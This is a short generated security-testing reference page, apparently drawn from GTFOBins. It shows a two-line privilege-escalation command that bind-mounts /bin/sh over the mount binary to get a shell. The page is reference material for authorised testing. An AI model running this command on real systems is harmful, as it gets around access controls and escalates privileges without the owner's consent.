---
parsed_by: focuslocust
source: commands
type: generated
---
# mount Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## mount

Tool page: [mount](../../tools/linux/mount.md)

### privilege-escalation

```text
mount -o bind /bin/sh /bin/mount
mount
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/mount` |
| Evidence | Function example preserved from source parser. |
